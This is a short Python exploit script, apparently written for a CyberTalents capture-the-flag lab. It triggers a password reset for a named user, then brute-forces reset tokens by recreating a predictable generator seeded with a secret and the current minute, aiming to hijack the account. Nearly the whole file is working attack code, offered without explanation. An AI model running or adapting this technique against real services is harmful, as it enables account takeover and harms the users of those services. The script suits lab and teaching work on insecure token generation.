import random
from datetime import datetime, timedelta
import string
import requests

# ID of user is: 262
# mcalderwood79@storify.com
# Mariel Calderwood
# CH5CSTBK6QH6N8J77VNR8KN44RAHXNP2


param = {
    "email":"mcalderwood79@storify.com"
}

requests.post("http://wcomol2z7qrsm350m73p9p6tqzqw873okkxmswvy-web.cybertalentslabs.com/forgot_password", params=param)


def generate_reset_token(secret, current_time_minutes, token_length=32):
    letters_and_digits = string.ascii_uppercase + string.digits

    seed = secret + str(current_time_minutes)
    random.seed(seed)
    reset_token = ''.join(random.choice(letters_and_digits) for _ in range(token_length))

    return reset_token


for i in range(10):
    current_time_minutes = int(datetime.now().timestamp() // 60) - 3 + i
    print(current_time_minutes)
    token = generate_reset_token("CH5CSTBK6QH6N8J77VNR8KN44RAHXNP2", current_time_minutes)
    r = requests.get(f"http://wcomol2z7qrsm350m73p9p6tqzqw873okkxmswvy-web.cybertalentslabs.com/reset_password/{token}", allow_redirects=True)
    if "Invalid or expired reset token." in r.text:
        print(token)
    else:
        print(f"Token Valid:  {token}")
        break